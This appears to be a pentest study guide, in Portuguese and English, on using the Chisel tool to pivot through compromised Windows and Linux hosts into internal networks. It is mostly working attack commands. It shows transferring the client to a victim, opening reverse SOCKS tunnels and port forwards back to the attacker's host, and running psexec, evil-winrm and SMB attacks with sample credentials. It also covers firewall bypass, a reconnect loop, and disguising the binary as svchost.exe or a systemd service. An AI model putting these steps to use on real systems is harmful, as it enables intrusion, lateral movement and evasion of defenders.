# Chisel Complete Setup Guide

## Table of Contents

- [Installation](#installation)
- [Basic Tunnel Setup](#basic-tunnel-setup)
- [Single-Hop Pivoting](#single-hop-pivoting)
- [Multi-Hop Pivoting](#multi-hop-pivoting)
- [Advanced Routing](#advanced-routing)
- [Troubleshooting](#troubleshooting)

---

## Installation

### Quick Check (One-liner)

```shell
# Verificar se Chisel está instalado
which chisel || apt install chisel -y
chisel --version
```

> ⚠️ **Erros Comuns:**
>
> | Erro | Causa | Fix |
> | --- | --- | --- |
> | `command not found: chisel` | Não instalado | `apt install chisel` ou baixar manualmente |
> | `bind: permission denied` | Porta < 1024 sem root | Use porta > 1024 ou execute com `sudo` |
> | `connection refused` | Server não iniciado | Inicie o server antes do client |

### Attacker Machine (Kali)

> Chisel já vem no Kali. Se precisar da versão mais recente:

```shell
# Download manual (versão mais recente)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz
gzip -d chisel_1.10.1_linux_amd64.gz
mv chisel_1.10.1_linux_amd64 chisel
chmod +x chisel
./chisel --version
```

> Ou via apt (versão do repositório):

```shell
apt install chisel -y
```

### Target Machine (Windows/Linux)

> Download do binário para Windows

```powershell
# PowerShell no target
iwr -Uri "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_windows_amd64.gz" `
  -Outfile chisel.gz
# Extrair com 7zip ou similar
```

> Transferência via servidor HTTP (método preferido)

```shell
# No Kali: servir o binário
cp /usr/bin/chisel /var/www/html/
python3 -m http.server 8000

# No target Windows:
iwr -Uri "http://192.168.49.87:8000/chisel" -Outfile chisel.exe

# No target Linux:
wget http://192.168.49.87:8000/chisel
chmod +x chisel
```

---

## Basic Tunnel Setup

### Modo SOCKS5 Proxy (mais comum)

> Este é o modo padrão para pivoting. O Chisel cria um proxy SOCKS5 no Kali,
> e o proxychains roteia o tráfego através dele.

#### Step 1: Iniciar Server no Kali (Attacker)

```shell
# Server escuta na porta 1080
chisel server --port 1080 --reverse
```

**Output esperado:**

```text
2024/01/01 00:00:00 server: Listening on http://0.0.0.0:1080
```

**Flags Explicadas:**

- `--port 1080`: Porta de escuta (use 443, 80 ou 8080 para bypass de firewall)
- `--reverse`: Permite que clients abram tunnels reversos (essencial para pivoting)
- `--auth user:pass`: Autenticação opcional
- `--socks5`: Habilitar SOCKS5 (habilitado por padrão no modo reverse)
- `--host 0.0.0.0`: Escutar em todas as interfaces

#### Step 2: Conectar Client no Target

> No target Windows:

```powershell
.\chisel.exe client 192.168.49.87:1080 R:socks
```

> No target Linux:

```shell
./chisel client 192.168.49.87:1080 R:socks
```

**Output esperado no server:**

```text
2024/01/01 00:00:00 server: session#1: Connected (192.168.49.100:54321)
```

#### Step 3: Configurar Proxychains no Kali

```shell
# Editar /etc/proxychains4.conf
# Comentar socks4 e adicionar:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Ou editar manualmente:
tail -5 /etc/proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080
```

> Verificar configuração

```shell
grep -E "^socks" /etc/proxychains4.conf
# socks5  127.0.0.1 1080
```

#### Step 4: Usar o Tunnel

```shell
# Testar conectividade interna
proxychains nmap -Pn -p 445,22,80,3306 172.16.87.200

# Ferramentas via tunnel
proxychains nxc smb 172.16.87.200 -u admin -p Password123
proxychains impacket-psexec admin@172.16.87.200
proxychains curl http://172.16.87.200
```

---

## Single-Hop Pivoting

### Scenario: Attacker → WS26 → Internal Network

**Setup:**

- Attacker: 192.168.49.87 (Kali)
- Comprometido: 192.168.49.100 (WS26)
- Alvo interno: 172.16.87.200 (SRV22)

### Complete Workflow

> Step 1: Iniciar server Chisel no Kali

```shell
chisel server --port 443 --reverse
```

> Step 2: Transferir client para WS26

```powershell
# No WS26
iwr -Uri "http://192.168.49.87:8000/chisel.exe" -Outfile C:\Temp\chisel.exe
```

> Step 3: Conectar client ao server

```powershell
# No WS26
C:\Temp\chisel.exe client 192.168.49.87:443 R:socks
```

> Step 4: Configurar proxychains e escanear

```shell
# Verificar /etc/proxychains4.conf tem: socks5 127.0.0.1 1080
proxychains nmap -Pn -p 445,3389,5985 172.16.87.200 -sV --open
```

> Step 5: Explorar rede interna

```shell
# SMB
proxychains nxc smb 172.16.87.200 -u svc_sql -p SQLPowerHouse333

# RDP
proxychains xfreerdp3 /u:Administrator /p:Password123 /v:172.16.87.200

# WinRM
proxychains evil-winrm -i 172.16.87.200 -u Administrator -p Password123

# Impacket
proxychains impacket-psexec svc_sql:SQLPowerHouse333@172.16.87.200
```

---

## Multi-Hop Pivoting

### Scenario: Attacker → WS26 → SRV22 → DC20

**Network Layout:**

```text
[Attacker]  →  [WS26]        →  [SRV22]        →  [DC20]
192.168.49.87  192.168.49.100   172.16.87.100     172.16.100.200
                (pivot 1)        (pivot 2)
```

### Multi-Hop Setup

> Step 1: Primeiro hop — WS26 conecta ao Kali

```shell
# Kali: inicia server
chisel server --port 443 --reverse
```

```powershell
# WS26: conecta ao Kali
.\chisel.exe client 192.168.49.87:443 R:socks
```

> Step 2: Segundo hop — Iniciar novo server Chisel no Kali (porta diferente)

```shell
# Kali: segundo server para o próximo pivot
chisel server --port 8443 --reverse
```

> Step 3: Do Kali, encaminhar acesso ao SRV22 via primeiro tunnel

```shell
# Encaminhar porta 8443 do Kali para dentro da rede interna via proxychains
# No WS26 (executar via shell obtido pelo primeiro tunnel):
proxychains ./chisel client 192.168.49.87:8443 R:socks
```

> Alternativa: port forwarding direto para uma porta específica

```shell
# Kali: encaminhar porta local 3306 para DB interno via WS26
chisel server --port 443 --reverse

# WS26: criar forward da porta 3306 interna
.\chisel.exe client 192.168.49.87:443 R:3306:172.16.87.200:3306
```

```shell
# Kali: conectar diretamente na porta encaminhada
mysql -h 127.0.0.1 -P 3306 -u root -pPassword
```

### Port Forwarding Direto (Sem SOCKS)

> Encaminhar uma porta específica do target para o Kali

```shell
# Kali: server esperando forward reverso
chisel server --port 1080 --reverse

# Target: encaminhar RDP interno para Kali:3389
.\chisel.exe client 192.168.49.87:1080 R:3389:172.16.87.200:3389

# Kali: conectar via porta local
xfreerdp3 /u:Administrator /p:Password123 /v:127.0.0.1:3389
```

> Encaminhar múltiplas portas de uma vez

```shell
# Target
.\chisel.exe client 192.168.49.87:1080 R:3389:172.16.87.200:3389 R:445:172.16.87.200:445 R:5985:172.16.87.200:5985
```

---

## Advanced Routing

### SOCKS5 com Autenticação

> Adicionar autenticação para evitar uso indevido

```shell
# Server com autenticação
chisel server --port 1080 --reverse --auth pentest:Password123

# Client com autenticação
.\chisel.exe client --auth pentest:Password123 192.168.49.87:1080 R:socks
```

### Usando Porta 443/80 para Bypass de Firewall

```shell
# Server na porta 443 (simula HTTPS)
chisel server --port 443 --reverse --tls-domain "" --key /etc/ssl/private/key.pem

# Ou porta 80
chisel server --port 80 --reverse
```

### Forward Mode (Client → Server, sem reverse)

> Quando o Kali pode conectar diretamente ao target

```shell
# Target inicia server
.\chisel.exe server --port 9090

# Kali conecta ao target e abre SOCKS local
chisel client 192.168.49.100:9090 socks
```

### Verificar Tunnel Ativo

```shell
# Verificar processo chisel server
ps aux | grep chisel

# Verificar porta em uso
ss -tlnp | grep chisel
netstat -tlnp | grep 1080

# Testar SOCKS proxy
curl --socks5 127.0.0.1:1080 http://172.16.87.200
```

---

## Troubleshooting

### Issue 1: Client Não Conecta

**Error:** `connection refused` ou timeout

> Verificar server está ativo no Kali

```shell
ss -tlnp | grep 1080
# Deve mostrar: 0.0.0.0:1080
```

> Verificar firewall no Kali

```shell
sudo ufw allow 1080
sudo ufw allow 443
```

> Usar verbose para debug

```shell
chisel server --port 1080 --reverse --verbose

# Client com verbose
.\chisel.exe client --verbose 192.168.49.87:1080 R:socks
```

### Issue 2: Proxychains Não Roteia

**Error:** `|S-chain|-<>-127.0.0.1:1080-<><>-TIMEOUT`

> Verificar configuração do proxychains

```shell
grep -v "^#" /etc/proxychains4.conf | grep -v "^$"
# Deve ter: socks5 127.0.0.1 1080
```

> Garantir que dynamic_chain está habilitado (não strict_chain)

```shell
grep -E "^(dynamic|strict|random)" /etc/proxychains4.conf
# Mudar para: dynamic_chain
```

> Testar conectividade SOCKS manualmente

```shell
curl --socks5 socks5h://127.0.0.1:1080 http://172.16.87.200
```

### Issue 3: DNS Não Resolve Pelo Tunnel

> Usar `proxychains4 -q` com resolução DNS pelo proxy

```shell
# Editar /etc/proxychains4.conf e habilitar:
# proxy_dns

# Testar resolução
proxychains nslookup dc01.corp.local 172.16.87.1
```

### Issue 4: Tunnel Cai Frequentemente

> Usar flag `--keepalive` no client

```shell
.\chisel.exe client --keepalive 10s 192.168.49.87:1080 R:socks
```

> Reiniciar automaticamente (Linux target)

```bash
while true; do ./chisel client 192.168.49.87:1080 R:socks; sleep 5; done
```

### Issue 5: Performance Lenta

> Verificar latência do tunnel

```shell
proxychains ping 172.16.87.200
```

> Usar conexão direta quando possível (evitar múltiplos hops)

```shell
# Em vez de proxychains + nmap completo:
proxychains nmap -Pn --open -p 445,22,80,443,3389,5985 172.16.87.200
```

---

## Security Considerations

### Ocultar Processo Chisel

> No Windows, renomear o binário

```powershell
ren chisel.exe svchost.exe
# Ou
copy chisel.exe C:\Windows\Temp\WindowsUpdate.exe
```

> No Linux, disfarçar o processo

```bash
cp chisel /usr/local/bin/systemd-network
/usr/local/bin/systemd-network client 192.168.49.87:1080 R:socks
```

### Cleanup

> Matar o processo no target Windows

```powershell
taskkill /IM chisel.exe /F
del C:\Temp\chisel.exe
```

> Matar no target Linux

```bash
pkill -f chisel
rm -f /tmp/chisel
```

> Parar o server no Kali

```shell
pkill -f "chisel server"
```

---

## Quick Reference

### SOCKS5 Pivot (30 segundos)

```bash
# Terminal 1 (Kali): iniciar server
chisel server --port 1080 --reverse

# Target: conectar client
.\chisel.exe client 192.168.49.87:1080 R:socks

# Terminal 2 (Kali): usar tunnel
proxychains nmap -Pn -p 445,22,3389 172.16.87.200
proxychains nxc smb 172.16.87.200 -u user -p password
```

### Port Forward Direto (sem proxychains)

```bash
# Kali: server
chisel server --port 1080 --reverse

# Target: encaminhar porta específica
.\chisel.exe client 192.168.49.87:1080 R:3306:172.16.87.200:3306

# Kali: usar porta local
mysql -h 127.0.0.1 -P 3306 -u root -pPassword
```

### Verificar Tudo Funcionando

```shell
# Tunnel ativo
ss -tlnp | grep 1080

# SOCKS funcionando
curl --socks5 127.0.0.1:1080 http://172.16.87.200

# Proxychains operacional
proxychains curl http://172.16.87.200
proxychains nxc smb 172.16.87.200
proxychains impacket-psexec user@172.16.87.200
```

---

## Chisel vs Ligolo-ng

| Característica | Chisel | Ligolo-ng |
| --- | --- | --- |
| Instalação | Binário único | Proxy + Agent separados |
| Configuração | Simples | Mais complexa |
| Uso de CPU | Baixo | Baixo |
| Multi-hop | Manual | Interface CLI dedicada |
| Interface TUN | Não | Sim (roteamento nativo) |
| SOCKS5 | Sim | Sim |
| Port Forward | Sim | Via listener_add |
| Ideal para | Pivoting rápido | Redes complexas |

> **Regra geral:** Use Chisel para pivoting rápido e simples. Use Ligolo-ng quando precisar de roteamento nativo (sem proxychains) ou múltiplos hops complexos.

---

## See Also

### Related Lateral Movement Files

- **[Ligolo-ng Complete Guide](Ligolo-ng-Complete-Guide.md)** - Tunneling com interface TUN, multi-hop avançado
- **[Pivoting & Tunneling](Pivoting-Tunneling.md)** - SSH tunnels, Proxychains, sshuttle
- **[Lateral Movement](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash

### AD Exploitation (After Pivoting)

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound na rede interna
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Ataques ao DC após tunnel
- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder através do tunnel
